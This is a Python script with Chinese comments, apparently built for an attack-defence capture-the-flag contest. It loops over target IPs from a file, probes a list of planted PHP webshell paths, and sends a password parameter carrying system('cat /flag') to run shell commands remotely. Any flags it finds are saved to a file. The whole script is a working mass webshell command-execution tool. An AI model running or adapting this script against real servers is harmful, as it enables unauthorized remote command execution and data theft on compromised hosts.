import requests
from requests.exceptions import Timeout

# 命令执行配置
PASSWORD = 'cmd'
COMMAND = "cat /flag"

PATH = ''      # 上传路径
# 多个可能的不死马路径
SHELL_PATHS = [
    '/upload1.php',
    '/upload2.php',
    '/good.php',
    '/hhh.php',
    '/index1.php',
    '/1ndex.php',
    '/hack.php',
    '/flag.php',
    '/hhhwiw.php',
    '/ffooof.php',
    '/.upload.php',
]

# 遍历所有 IP
with open('ip.txt', 'r', encoding='utf-8') as f:
    for line in f:
        ip = line.strip()
        success = False

        for path in SHELL_PATHS:
            url = f'http://{ip}{PATH}{path}'
            data = {
                "ise":"ise666",
                PASSWORD: f"system('{COMMAND}');"
            }

            try:
                print(f"[*] 目标 {ip} -> 正在尝试马: {path}")
                res = requests.get(url, params=data, timeout=3)
                res.raise_for_status()
                content = res.text.strip()

                if 'flag' in content.lower():
                    print(f"[√] 成功: {ip} -> {path} -> {content}")
                    with open('flag.txt', 'a', encoding='utf-8') as fout:
                        fout.write(f"{content}\n")
                    success = True
                    print("[√] 成功获取flag,不继续尝试其他马")
                    break

            except Timeout:
                print(f"[×] 超时: {ip} -> {path}")
            except Exception as e:
                print(f"[!] 错误: {ip} -> {path} - {e}")

        if not success:
            print(f"[×] 所有不死马失败: {ip}")
